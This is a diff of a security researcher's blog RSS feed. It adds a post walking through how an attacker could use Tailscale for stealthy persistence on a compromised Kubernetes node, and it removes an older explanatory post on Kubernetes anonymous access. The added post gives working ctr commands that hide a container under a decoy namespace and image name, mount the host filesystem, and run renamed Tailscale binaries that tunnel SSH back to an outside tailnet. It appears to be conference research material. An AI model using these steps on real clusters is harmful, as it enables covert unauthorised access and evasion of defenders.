@@ -7,6 +7,109 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Using Tailscale for persistence</title>
+				<description>&lt;p&gt;I’ve written &lt;a href=&quot;https://raesene.github.io/blog/2022/06/11/escaping-the-nested-doll-with-tailscale/&quot;&gt;before&lt;/a&gt; about how there’s lots of innovative uses for &lt;a href=&quot;https://tailscale.com/&quot;&gt;Tailscale&lt;/a&gt; and I was playing with another scenario for my &lt;a href=&quot;https://cfp.cloud-native.rejekts.io/cloud-native-rejekts-eu-paris-2024/talk/ZJEVSY/&quot;&gt;Cloud Native Rejekts talk&lt;/a&gt; (&lt;a href=&quot;https://www.youtube.com/watch?v=-9GN057zm_U&amp;amp;t=19240s&quot;&gt;Video Recording here&lt;/a&gt; ), so I thought it’d be worth writing up as I learned some things along the way!&lt;/p&gt;
+
+&lt;p&gt;The idea here is to see how someone could use Tailscale as part of getting persistence on a compromised system (for example a Kubernetes cluster) to keep access in a relatively stealthy fashion. We’re running Tailscale inside a container running on a Kubernetes node and we want to communicate back to a host outside the cluster over the network.&lt;/p&gt;
+
+&lt;p&gt;Whilst Tailscale generally uses UDP for its communications, it can also communicate over 443/TCP using &lt;a href=&quot;https://tailscale.com/blog/how-tailscale-works#encrypted-tcp-relays-derp&quot;&gt;DERP&lt;/a&gt; meaning it should work as long as the compromise host can initiate outbound connections on 443/TCP (a reasonably common configuration!)&lt;/p&gt;
+
+&lt;h2 id=&quot;setting-up-our-tailnet&quot;&gt;Setting up our tailnet&lt;/h2&gt;
+
+&lt;p&gt;For this I set-up a new isolated tailnet, to keep the ACLs simple. It’s relatively easy to switch between tailnets, so there’s no major downside to having a dedicated tailnet, as all the features we want to use are available on Tailscale’s free tier.&lt;/p&gt;
+
+&lt;p&gt;Once we’ve got our new tailnet, the goal is to have two groups of systems. The first one is our controllers, which will connect back into our compromised node(s). The second group is the “bots” which we’ll install on our target systems.&lt;/p&gt;
+
+&lt;p&gt;Then we want to configure Tailscale so that traffic from the controllers to the bots is allowed, but no traffic from bots back to controllers (or bots to other bots) is permitted. Tailscale provide a nice ACL system, which we can use to create this setup.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+
+	// Create our bots and controllers groups
+	&quot;tagOwners&quot;: {
+		&quot;tag:bots&quot;:        [&quot;autogroup:admin&quot;],
+		&quot;tag:controllers&quot;: [&quot;autogroup:admin&quot;],
+	},
+
+	&quot;acls&quot;: [
+		// Accept traffic from controllers to bots
+		{&quot;action&quot;: &quot;accept&quot;, &quot;src&quot;: [&quot;tag:controllers&quot;], &quot;dst&quot;: [&quot;tag:bots:*&quot;]},
+	],
+
+	// Define users and devices that can use Tailscale SSH.
+	&quot;ssh&quot;: [
+		// Accept SSH connections from controllers to bots
+		{
+			&quot;action&quot;: &quot;accept&quot;,
+			&quot;src&quot;:    [&quot;tag:controllers&quot;],
+			&quot;dst&quot;:    [&quot;tag:bots&quot;],
+			&quot;users&quot;:  [&quot;autogroup:nonroot&quot;, &quot;root&quot;],
+		},
+	],
+}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;One slightly un-intuitive piece is that you need to define tags in an ACL policy &lt;em&gt;before&lt;/em&gt; assigning them to any hosts.&lt;/p&gt;
+
+&lt;p&gt;Once the ACL policy is in place you can just assign a tag to the control host in the Tailscale GUI&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/tailscale-acl.png&quot; alt=&quot;Tailscale ACL&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For our bots, we can use Tailscale’s &lt;a href=&quot;https://tailscale.com/kb/1085/auth-keys&quot;&gt;Auth Key&lt;/a&gt; feature, and generate a key that can be used for all our bots, but also has the “bot” tag applied to it automatically, so there’s no risk of them inadvertently getting more access than we want.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/tailscale-auth-keys.png&quot; alt=&quot;Tailscale ACL&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;running-tailscale-on-our-bot-hosts&quot;&gt;Running Tailscale on our bot hosts&lt;/h2&gt;
+
+&lt;p&gt;Now that we’ve got our tailnet configured, the next step is to deploy on our compromised hosts. In the scenario I used for my talk, the attacker has access to cluster-admin level credentials for a brief period of time, so wants to use Tailscale to help them retain access after that window of opportunity closes.&lt;/p&gt;
+
+&lt;p&gt;One way of running Tailscale that should always work is to use a container, as typically Kubernetes cluster nodes can always run containers :) We could either run a new container using the runtime on the node (e.g. Containerd) or use Kubernetes static manifests to have the Kubelet run it for us.&lt;/p&gt;
+
+&lt;h3 id=&quot;running-with-containerd&quot;&gt;Running with Containerd&lt;/h3&gt;
+
+&lt;p&gt;It’s possible to use Containerd to run a new container on a Kubernetes node using the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; client. Whilst there are better clients like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nerdctl&lt;/code&gt; available, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; will always be available and we can do what we need with it.&lt;/p&gt;
+
+&lt;p&gt;One slight complication with this approach is that it won’t work from inside a container (for example the one provided by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl debug node&lt;/code&gt;), as Containerd’s API expects the client to have the same resources available to it as the server (unlike Docker, where all that’s required is access to the Docker socket). You can get round this by doing something like SSH’ing to the node.&lt;/p&gt;
+
+&lt;p&gt;First up we’ll create a new Containerd namespace. This makes it a little harder to spot the container if someone looks at the containers running on the host.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr namespace create sys_net_mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once we’ve created the namespace, we can pull a new container image down to the node. In my case I’ve created an image on Docker hub with Tailscale and a couple of other tools, which I called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon&lt;/code&gt; , no need to make the blue team’s job too easy by calling it something like “botnet_node” :D&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon images pull docker.io/raesene/systemd_net_mon:latest
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once the image is available on the node we can just run it, while providing full access to the node filesystem.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/systemd_net_mon:latest sys_net_mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then from inside the container, we just need two commands to start Tailscale up and connect it to our tailnet. Here we can make use of the fact that Tailscale is provided as a pair of Golang binaries, by just renaming them the server to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_server&lt;/code&gt; and the client to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_client&lt;/code&gt;. That way if someone runs a process list on the host, that’s all they’ll see, a bit less obvious than tailscale itself.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_client up --ssh --hostname cafebot --auth-key=[AUTH_KEY_HERE]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With that, our bot will be up and connected to the Tailnet. We can then connect to it via Tailscale’s embedded SSH daemon, with all the traffic going over the Tailscale tunnel.&lt;/p&gt;
+
+&lt;h3 id=&quot;running-with-static-manifests&quot;&gt;Running with static manifests&lt;/h3&gt;
+
+&lt;p&gt;Another way of doing this is to create a static Kubernetes manifest and put it in the directory the Kubelet watches (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/kubernetes/manifests&lt;/code&gt;). The advantages of this approach is that they Kubelet will take care of re-starting the pod if necessary.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This was just a quick walkthrough of using Tailscale for creating a little “botnet”. Whilst there are many tools to do this with, it’s always interesting to explore other options!&lt;/p&gt;
+</description>
+				<pubDate>Sun, 24 Mar 2024 07:27:00 +0000</pubDate>
+				<link>https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</guid>
+			</item>
+		
+			<item>
 				<title>A final Kubernetes census</title>
 				<description>&lt;p&gt;Well, all good things must come to an end. Over the last couple of years I’ve been using the &lt;a href=&quot;https://censys.io&quot;&gt;Censys&lt;/a&gt; API to track the number of Kubernetes clusters exposed to the internet which disclose their version number, and I’ve written about it a couple of times &lt;a href=&quot;https://raesene.github.io/blog/2021/06/05/A-Census-of-Kubernetes-Clusters/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://raesene.github.io/blog/2022/07/03/lets-talk-about-kubernetes-on-the-internet/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
@@ -874,66 +977,6 @@ kube-system   bootstrap-token-abcdef   bootstrap.kubernetes.io/token   6      34
 				<pubDate>Sat, 08 Apr 2023 15:27:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2023/04/08/lets-talk-about-kubelet-authorization/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2023/04/08/lets-talk-about-kubelet-authorization/</guid>
-			</item>
-		
-			<item>
-				<title>Let's talk about anonymous access to Kubernetes</title>
-				<description>&lt;p&gt;This week there were some articles about the &lt;a href=&quot;https://www.bleepingcomputer.com/news/security/first-known-dero-cryptojacking-operation-seen-targeting-kubernetes/&quot;&gt;Dero Cryptojacking operation&lt;/a&gt; and one of the details about what the attackers did caught my eye. It was mentioned that they were attacking clusters that allowed anonymous access to the Kubernetes API. Exactly how and why anonymous access is possible to Kubernetes is kind of an interesting topic that touches on a few different areas, so I thought I’d write a bit about it.&lt;/p&gt;
-
-&lt;h2 id=&quot;how-does-anonymous-access-work&quot;&gt;How does anonymous access work?&lt;/h2&gt;
-
-&lt;p&gt;Whether anonymous access works on a cluster is controlled by a flag on the &lt;a href=&quot;https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/&quot;&gt;kube-apiserver&lt;/a&gt; component. The flag is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth&lt;/code&gt; and it defaults to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, so if you don’t see it in the list of parameters passed to the server anonymous access will be enabled.&lt;/p&gt;
-
-&lt;p&gt;However on it’s own that won’t actually give attackers a lot of access to the cluster, as it only covers one of the three gates a request passes through before it’s processed. As shown in the Kubernetes docs &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/controlling-access/&quot;&gt;controlling access&lt;/a&gt; section after authentication, the request then has to pass authorization and admission control.&lt;/p&gt;
-
-&lt;h2 id=&quot;authorization-and-anonymous-access&quot;&gt;Authorization and anonymous access&lt;/h2&gt;
-
-&lt;p&gt;So the next step is that a request will need to match an authorization policy (typically RBAC, but possibly others as well). Of course in order to do that the request has to be assigned to an identity, and that’s where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:anonymous&lt;/code&gt; user and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:unauthenticated&lt;/code&gt; group come in. These identities are assigned to any request that doesn’t have a valid authentication token, and are used to match against authorization policies.&lt;/p&gt;
-
-&lt;p&gt;You can see this in action by looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; on a Kubeadm cluster.&lt;/p&gt;
-
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRoleBinding&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;annotations&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;rbac.authorization.kubernetes.io/autoupdate&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;true&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;labels&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;kubernetes.io/bootstrapping&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac-defaults&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:public-info-viewer&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;roleRef&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ClusterRole&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:public-info-viewer&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Group&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:authenticated&lt;/span&gt;
-&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;apiGroup&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;rbac.authorization.k8s.io&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Group&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;system:unauthenticated&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;anonymous-access-in-the-wild&quot;&gt;Anonymous access in the wild&lt;/h2&gt;
-
-&lt;p&gt;Now we know how anonymous access works, the question is going to be “how common is this?”. The answer is that most major distributions will enable anonymous access by default and will generally provide access to some limited number of endpoints via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; which provides access to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/version&lt;/code&gt; endpoint along with a couple of others.&lt;/p&gt;
-
-&lt;p&gt;To get a sense for how many clusters this applies to we can just use &lt;a href=&quot;https://search.censys.io/&quot;&gt;censys&lt;/a&gt; or &lt;a href=&quot;https://www.shodan.io/&quot;&gt;shodan&lt;/a&gt; to look for clusters that return version information. This &lt;a href=&quot;https://search.censys.io/search?resource=hosts&amp;amp;q=services.kubernetes.version_info.git_version%3D%22*%22&quot;&gt;censys query&lt;/a&gt; for example shows just over one million hosts that return version information, so we can say that it’s a fairly common configuration.&lt;/p&gt;
-
-&lt;p&gt;A more serious question, which corresponds more to the points raised in the dero artice is, how many of these clusters would allow for an attacker to create workloads in them. Whilst you can’t get that exact information from Censys, it does have a query showing clusters that allow for anonymous users to enumerate pods in the cluster which shows &lt;a href=&quot;https://search.censys.io/search?resource=hosts&amp;amp;q=services.kubernetes.pod_names%3D%22*%22&quot;&gt;302 cluster nodes&lt;/a&gt; at time of writing. I’d guess some/most of those are honeypots, but also probably a couple of vulnerable clusters in there.&lt;/p&gt;
-
-&lt;h2 id=&quot;disabling-anonymous-access&quot;&gt;Disabling anonymous access&lt;/h2&gt;
-
-&lt;p&gt;On an unmanaged cluster (e.g. Rancher, Kubespray, Kubeadm) you can disable anonymous access by passing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--anonymous-auth=false&lt;/code&gt; flag to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-apiserver&lt;/code&gt; component. On managed clusters (e.g. EKS, GKE, AKS) you can’t do that, however what you can do is remove any RBAC rules which allow anonymous users to perform actions. For example, on a Kubeadm cluster you can remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:public-info-viewer&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrole&lt;/code&gt; and that effectively stop anonymous users getting information from the cluster.&lt;/p&gt;
-
-&lt;p&gt;Of course, if you have any applications that rely on those endpoints (for example for health checks) they would break, so it’s important to test any changes you make to the cluster. One option here would be to review your audit logs and see if there are any anonymous requests made to the API server.&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;Allowing some level of anonymous access is a common default in Kubernetes. In and of itself it’s not a great security concern, however it does mean that in many configurations the only thing stopping attackers compromising your cluster is RBAC rules, so a single mistake could cause significant issues, especially if your cluster is exposed to the internet.&lt;/p&gt;
-</description>
-				<pubDate>Sat, 18 Mar 2023 14:27:00 +0000</pubDate>
-				<link>https://raesene.github.io/blog/2023/03/18/lets-talk-about-anonymous-access-to-Kubernetes/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2023/03/18/lets-talk-about-anonymous-access-to-Kubernetes/</guid>
 			</item>
 		
 	</channel>
